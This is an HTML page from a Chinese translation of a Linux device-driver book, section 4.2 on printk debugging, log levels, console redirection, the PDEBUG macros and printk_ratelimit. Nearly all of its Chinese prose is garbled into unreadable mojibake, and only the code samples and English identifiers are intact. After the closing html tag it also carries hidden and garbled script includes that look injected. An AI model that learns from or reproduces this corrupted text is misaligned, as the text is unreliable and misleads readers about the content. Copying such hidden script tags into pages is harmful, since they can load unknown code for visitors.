<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>4.2.&#160;ôӡ-Linux豸棨İ棩- - </title>
<meta name="description" content="- - " />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,, " />
<meta name="author" content="  www.21cstar.com QQ:610061171" /> 
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="ch04.html" title="&#160;4&#160;&#160;Լ">
<link rel="prev" href="ch04.html" title="&#160;4&#160;&#160;Լ">
<link rel="next" href="ch04s03.html" title="4.3.&#160;òѯ">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">4.2.&#160;ôӡ</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch04.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;4&#160;&#160;Լ</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch04s03.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="DebuggingbyPrinting"></a>4.2.&#160;ôӡ</h2></div></div></div>
<p>õĵԼǼ, Ӧó̵ͨںʵĵط printf ʵ. ں˴ʱ, ͨ printk ﵽĿ.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="printk"></a>4.2.1.&#160;printk</h3></div></div></div>
<p>ǰ漸ʹ printk , 򵥵ؼͬ printf һʹ. ڵʱһЩͬĵط.</p>
<p>һͬ printk Ϣس̶ȶ, ͨӲͬļ¼ȼϢ. 㳣һ궨ָʾ¼. , KERN_INFO, ֮ǰһЩӡǰ濴, Ϣ¼һֵֿ. ¼궨չһִ, ڱʱϢıһ; Ϊʲôȼ͸ʽ֮ûжŵԭ.  2  printk , һϢ, һϢ:</p>
<pre class="programlisting">
printk(KERN_DEBUG "Here I am: %s:%i\n", __FILE__, __LINE__);
printk(KERN_CRIT "I'm trashed; giving up on %p\n", ptr);
</pre>
<p> 8 ֿܵļ¼ִ, ͷļ &lt;linux/kernel.h&gt; ﶨ; ǰԵݼ˳г:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>KERN_EMERG</span></span></dt>
<dd><p>ڽϢ, ЩǰϢ.</p></dd>
<dt><span class="term"><span>KERN_ALERT</span></span></dt>
<dd><p>Ҫ̶.</p></dd>
<dt><span class="term"><span>KERN_CRIT</span></span></dt>
<dd><p>, صӲʧЧй.</p></dd>
<dt><span class="term"><span>KERN_ERR</span></span></dt>
<dd><p>; 豸ʹ KERN_ERR Ӳ.</p></dd>
<dt><span class="term"><span>KERN_WARNING</span></span></dt>
<dd><p>ľ, ЩԼϵͳ.</p></dd>
<dt><span class="term"><span>KERN_NOTICE</span></span></dt>
<dd><p>, Ȼֵע. һЩȫصᱨ.</p></dd>
<dt><span class="term"><span>KERN_INFO</span></span></dt>
<dd><p>ϢϢ. , ܶʱӡǷֵӲϢ.</p></dd>
<dt><span class="term"><span>KERN_DEBUG</span></span></dt>
<dd><p>Ϣ.</p></dd>
</dl></div>
<p>ÿִ( ں궨չ )һڽе. ķΧ 0  7, ԽСʾԽȼ.</p>
<p>һûָȼ printk ȱʡ DEFAULT_MESSAGE_LOGLEVEL,  kernel/printk.c ָΪһ.  2.6.10 ں, DEFAULT_MESSAGE_LOGLEVEL  KERN_WARNING, ڹȥ֪Ǹı.</p>
<p>ڼ¼, ں˿ܴӡϢǰ̨, һıģʽն, , һ̨ڴӡ. ȼСֵ console_loglevel, Ϣݽ̨, һһ( ṩһнβ, ʲô ).  klogd  syslogd ϵͳ, ںϢ׷ӵ /var/log/messages ( syslogd ô),  console_loglevel.  klogd û, ֻж /proc/kmsg (  dmsg  )Ϣȡûռ. ʹ klogd ʱ, Ӧס, ᱣͬ; ֻһ, , յظ.</p>
<p> console_loglevel ʼ DEFAULT_CONSOLE_LOGLEVEL, ҿͨ sys_syslog ϵͳ޸. һ޸ķڵ klogd ʱָ -c ,  klogd  manpage ָ. עҪı䵱ǰֵ, ɱ klogd, ʹ -c ѡ. , дһı̨¼. ᷢһİ汾 O' Reilly ṩ FTP վϵ miscprogs/setlevel.c. µļָδһ,  1  8 ֮ǰ,  1  8. Ϊ 1, ֻ 0 Ϣ( KERN_EMERG )̨; Ϊ 8, Ϣ, Ϣ, ʾ.</p>
<p>Ҳͨıļ /proc/sys/kernel/printk д̨¼. ļ 4 ֵ: ǰ¼, ûȷ¼Ϣȱʡ, С¼, Լʱȱʡ¼. дһֵļ͸ı䵱ǰ¼ֵ; , , ʹںϢڿ̨, ͨ򵥵:</p>
<pre class="screen"> # echo 8 &gt; /proc/sys/kernel/printk </pre>
<p>ӦΪʲô hello.c ʹ KERN_ALERT ־; ҪȷϢڿ̨.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="RedirectingConsoleMessages"></a>4.2.2.&#160;ض̨Ϣ</h3></div></div></div>
<p>Linux ڿ̨¼һЩ, 㷢Ϣһָ̨(Ŀ̨ʹõıĻ). ȱʡ, "̨"ǵǰն. ΪѡһͬնϢ, ɶκο̨豸 ioctl(TIOCLINUX). ĳ, setconsole, ѡĸ̨ںϢ; ɳû, Դ misc-progs Ŀ¼õ.</p>
<p>ȫ. ӦʹһָԽϢĿ̨ı.</p>
<pre class="programlisting">
int main(int argc, char **argv)
{
    char bytes[2] = {11,0}; /* 11 is the TIOCLINUX cmd number */
    if (argc==2) bytes[1] = atoi(argv[1]); /* the chosen console */
    else {

        fprintf(stderr, "%s: need a single arg\n",argv[0]); exit(1); } if (ioctl(STDIN_FILENO, TIOCLINUX, bytes)&lt;0) { /* use stdin */
        fprintf(stderr,"%s: ioctl(stdin, TIOCLINUX): %s\n",
                argv[0], strerror(errno));
        exit(1);
    }
    exit(0);
}
</pre>
<p>setconsole ʹ ioctl  TIOCLINUX, ʵض linux Ĺ. Ϊʹ TIOCLINUX, 㴫һָָֽΪ. ĵһֽһ, ָҪ, ֽض.  setconsole , ʹ 11, һֽ( bytes[1])ָ̨. TIOCLINUX ںԴ drivers/char/tty_io.c .</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="HowMessageGetLogged"></a>4.2.3.&#160;Ϣμ¼</h3></div></div></div>
<p>printk Ϣдһ __LOG_BUF_LEN ֽڳĻλ, ֵ 4 KB  1 MB, ںʱѡ. ŻκڵȴϢĽ, ˵, κϵͳ˯߻ڶȡ /proc/kmsg Ľ.  2 ־Ľӿڼǵͬ, ע,  /proc/kmsg жȡǴ־, Ȼ syslog ϵͳܹѡڷ־ݵͬʱ. ͨ, ȡ /proc ļЩ klogd ȱʡ. dmesg 鿴, ; ʵ, ݷظ stdout, ǷѾ.</p>
<p>ֹͣ klogd , żֹȡںϢ, ᷢ /proc һ FIFO, , ȴ. Ȼ, ޷ַʽϢ,  klogd Ѿڶͬ, ΪҪ.</p>
<p>λ, printk ƻزڻĿͷ, ǵϵ. , ¼̻ᶪʧϵ. ʹһλŵǿԺԵ. , λϵͳûһ־Ҳ, û˶ʱͨǾ˷ٵڴ. Linux ϢĽһ, printk Դκεط, һжϴ, ûܴӡ. ΨһȱǿܶʧһЩ.</p>
<p> klogd , ȡںϢַ syslogd, syslogd ż /etc/syslog.conf ҳδ. syslogd һʩһȼϢ; ʩȼֵ &lt;sys/syslog.h&gt; ж. ںϢ LOG_KERN ʩ¼, һӦ printk ʹõȼ(, LOG_ERR  KERN_ERR Ϣ).  klogd û, ݱڻλֱ˶߻汻.</p>
<p>ҪϵͳļϢ, ߸ klogd ָһ -f (ļ) ѡָʾϢһضļ, ߶ /etc/syslog.conf ӦҪ. һֿǲôֱķʽ: ɱ klogd ϸشӡϢһûõն,<sup>[<a name="id420973" href="#ftn.id420973">13</a>]</sup> ߴһûõ xterm Ϸ cat /proc/kmsg.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="TurningtheMessagesOnandOff"></a>4.2.4.&#160;򿪺͹رϢ</h3></div></div></div>
<p>, printk ǳڵԺͲ´. ʽʱ, 仰˵, Ӧȥ, ٹر, Щӡ. ҵ, ܻܿᷢ, Ϊ㲻ҪЩϢȥʱ, Ҫʵһ(˷һ bug), ҪٴһϢ. м 2 , ȫԵش򿪻رصϢʹ򿪻رյϢ.</p>
<p>չʾһֱ printk õķ, Եȫֵش򿪻ر; һ, ʹʱתһ printk ( printf).</p>
<div class="itemizedlist"><ul type="disc">
<li><p>ÿ printk Դ򿪻ر, ͨȥӵַ궨.</p></li>
<li><p>ϢϹر, ͨڱǰı CFLAGS ֵ.</p></li>
<li><p>ͬһ print ں˴ûʹ, ˶ڸϢ, ͲԳͬķʽ.</p></li>
</ul></div>
<p>ĴƬʵЩ, ֱͷļ scull.h:</p>
<pre class="programlisting">
#undef PDEBUG /* undef it, just in case */
#ifdef SCULL_DEBUG
# ifdef __KERNEL__

/* This one if debugging is on, and kernel space */
# define PDEBUG(fmt, args...) printk( KERN_DEBUG "scull: " fmt, ## args)
# else

/* This one for user space */
# define PDEBUG(fmt, args...) fprintf(stderr, fmt, ## args)
# endif
#else
# define PDEBUG(fmt, args...) /* not debugging: nothing */
#endif

#undef PDEBUGG #define PDEBUGG(fmt, args...) /* nothing: it's a placeholder */
</pre>
<p> PDEBUG ȥ, ȡ SCULL_DEBUG Ƿ, ԺַʽʾϢʺϴеĻ: ںоʹں˵ printk, ûռоʹ libc  fprintf ׼. PDEBUGG , 仰˵, ʲô; ׵"ע" print , ȫȥ.</p>
<p>Ϊһ򻯹, е makfile :</p>
<pre class="screen">
# Comment/uncomment the following line to disable/enable debugging
DEBUG = y

# Add your debugging flag (or not) to CFLAGS
ifeq ($(DEBUG),y)
 DEBFLAGS = -O -g -DSCULL_DEBUG # "-O" is needed to expand inlines
else
 DEBFLAGS = -O2
endif

CFLAGS += $(DEBFLAGS) 
</pre>
<p>гֵĺ궨 gcc  ANSI C Ԥչ, ִ֧ɱĺ궨.  gcc ӦǸ, Ϊں˹еķǳ gcc . , makefile  GNU 汾 make; һ, ںҲ GNU make, .</p>
<p>Ϥ C Ԥ, չĶʵһ"Լ"ĸ, 岻ͬļ, һ(λ)ֵÿ, ԱӦôϸ.</p>
<p>ÿԼԺͼ. õı̼ԺЧ֮ѡõƽ, ޷ʲôõ. ס, Ԥ(ͬеĳʽ)ڱʱִ, ±򿪻ıϢ. һܵѡʹ C , ʱִ, , ڳִʱ򿪻ıϢ. һõ, ÿδִʱҪĴ, ϢرҲӰЧ. ʱЧʧ޷.</p>
<p>ڳֵĺ궨Ѿ֤ڶõ, ΨһȱҪκζϢı±.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="RateLimiting"></a>4.2.5.&#160;</h3></div></div></div>
<p>㲻С, ᷢԼ printk ǧϢ, ѹ˿̨, ܵ, ʹϵͳ־ļ. ʹһٿ̨豸(, һ), ϢҲϵͳֻʹӦ. ǳϵͳĵط, ̨ͣ. , Ӧǳעӡʲô, رĲƷ汾Լرڳʼɺ. ͨ, ƷʱӦӡκζ; ӡӦָʾҪע쳣.</p>
<p>һ, 뷢һ־Ϣ, 豸ֹͣ. ӦСĲҪͷ. һʧԶɵϽܲÿǧεĳ; ÿζӡ"my device is broken", ܲ, ̨豸пܰռ CPU -- ûж̨, һڻһдӡ.</p>
<p>ںܶ, õһ־˵, "ѾԹ", ӡκκϢֻҪ־. Ȼ, мżһ"豸ǻ"ʾ. ںѾṩһ:</p>
<pre class="programlisting">
int printk_ratelimit(void); 
</pre>
<p>ӦΪӡһ᳣ܻظϢ֮ǰ. طֵ, ӡϢ, . , ͵ĵ:</p>
<pre class="programlisting">
if (printk_ratelimit())
    printk(KERN_NOTICE "The printer is still on fire\n");
</pre>
<p>printk_ratelimit ͨٶϢ̨. 𳬹һ޶, printk_ratelimit ʼ 0 ʹϢӵ.</p>
<p>printk_ratelimit Ϊͨ޸ /proc/sys/kern/printk_ratelimit( ʹϢǰȴ )  /proc/sys/kernel/printk_ratelimit_burst(ǰɽյϢ).</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="PrintingDeviceNumbers"></a>4.2.6.&#160;ӡ豸</h3></div></div></div>
<p>ż, һӡϢ, ӡȤӲ豸. ӡαŲر, , ΪһԿ, ںṩһЩʵõĺ궨(  &lt;linux/kdev_t.h&gt; ж)Ŀ:</p>
<pre class="programlisting">
int print_dev_t(char *buffer, dev_t dev); 
char *format_dev_t(char *buffer, dev_t dev);
</pre>
<p>궨嶼豸űĻ; Ψһ print_dev_t شӡַ,  format_dev_t ػ; , ֱ printk õĲ, Ǳס printk ֻṩһβвŻˢ. Ӧ㹻Դһ豸;  64 λԺں˷Կ, Ӧ 20 ֽڳ.</p>
</div>
<div class="footnotes">
<br><hr width="100" align="left">
<div class="footnote"><p><sup>[<a name="ftn.id420973" href="#id420973">13</a>] </sup>* , ʹ setlevel 8; setconsole 10 ն 10 ʾϢ.</p></div>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch04.html">һҳ</a>&#160;</td>
<td width="20%" align="center"><a accesskey="u" href="ch04.html">һ</a></td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch04s03.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">&#160;4&#160;&#160;Լ&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;4.3.&#160;òѯ</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>